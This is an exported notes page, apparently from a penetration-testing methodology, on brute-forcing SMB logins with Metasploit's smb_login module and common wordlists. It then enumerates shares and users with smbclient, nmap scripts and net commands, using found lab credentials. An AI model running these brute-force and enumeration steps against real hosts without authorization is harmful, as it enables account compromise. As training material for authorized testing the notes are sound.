<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>BruteForce Username and Password</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>BruteForce Username and Password</h1><br/>Windows file sharing explanation here: <strong> </strong><a href="Home--Penetration_Test_Methodology--Network_Pentest--Exploitation--Services_Attacks--NetBIOS,_SMB---p137,139_NetBIOS_explanation.html">NetBIOS</a><strong> </strong>and <a href="Home--Penetration_Test_Methodology--Network_Pentest--Exploitation--Services_Attacks--NetBIOS,_SMB---p445_SMB_explanation.html">SMB</a><br />Vulnerability Testing â†’  <a href="Home--Penetration_Test_Methodology--Network_Pentest--Exploitation--Services_Attacks--NetBIOS,_SMB.html">Here</a><br /><br /><strong><h3>Bruteforce Login</h3></strong><br />If we want to try to bruteforce the credentials for SMB login, we can use the metasploit module: auxiliary/scanner/smb/smb_login<br /><div class="codebox"><pre>msfconsole<br />use auxiliary<span style="color:#ff9d00;font-weight:700">/</span>scanner<span style="color:#ff9d00;font-weight:700">/</span>smb<span style="color:#ff9d00;font-weight:700">/</span>smb_login</pre></div><br /><br />set Password list from Seclists(<a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a>)<br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">set</span> PASS_FILE <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>seclists<span style="color:#ff9d00;font-weight:700">/</span>Passwords<span style="color:#ff9d00;font-weight:700">/</span>Common-Credentials<span style="color:#ff9d00;font-weight:700">/</span>best15.txt</pre></div><br />but better:<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">set</span> PASS_FILE <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>john<span style="color:#ff9d00;font-weight:700">/</span>password.lst</pre></div><br /><br />set User list from Seclists(<a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a>)<br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">set</span> USER_FILE <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>seclists<span style="color:#ff9d00;font-weight:700">/</span>Usernames<span style="color:#ff9d00;font-weight:700">/</span>top-usernames-shortlist.txt</pre></div><br /><br />set IP Address of the target host<br /><div class="codebox"><pre> <span style="color:#ff9d00;font-weight:700">set</span> RHOSTS &lt;IP_Address&gt;</pre></div><br /><br /><div class="codebox"><pre>run</pre></div><br /><br /><a href=""><img src="images/689-1.png" alt="images/689-1.png" /></a><br /><span style="text-decoration:underline;">Found Administrator credentials!</span><br />Username: administrator<br />Password: password<br /><br />2. <strong>Enumerate the Shares using username and password found</strong><br />Once we have found the credentials by bruteforce we can enumerate the shares<br />Linux(better!):<br /><div class="codebox"><pre>smbclient -L &lt;IP_Address&gt; --user=&lt;username&gt;%&lt;password&gt;    <span style="color:#0088ff;font-weight:400">#Linux</span></pre></div><br /><div class="codebox"><pre>nmap -script=smb-enum-shares --script-args smbusername=&lt;username&gt;,smbpass=&lt;password&gt; &lt;IP_Address&gt; -p445    <span style="color:#0088ff;font-weight:400">#Linux</span></pre></div><br />    <a href=""><img src="images/689-2.png" alt="images/689-2.png" /></a><br /><br />Windows:<br /><div class="codebox"><pre>net use <span style="color:#333333;font-weight:400">\\</span>&lt;IP_Address&gt;<span style="color:#333333;font-weight:400">\I</span>PC$ &lt;password&gt; <span style="color:#ff9d00;font-weight:700">/</span>u<span style="color:#ff9d00;font-weight:700">:</span>&lt;username&gt;<br />net view <span style="color:#333333;font-weight:400">\\</span>&lt;IP_Address&gt;</pre></div><br /><br />3. <strong>Enumerate users using username and password found</strong><br />    <div class="codebox"><pre>nmap --script=smb-enum-users -p 445 10.130.40.70 --script-args smbuser=administrator,smbpass=password</pre></div><br />    <a href=""><img src="images/689-3.png" alt="images/689-3.png" /></a></div>
</body>
</html>
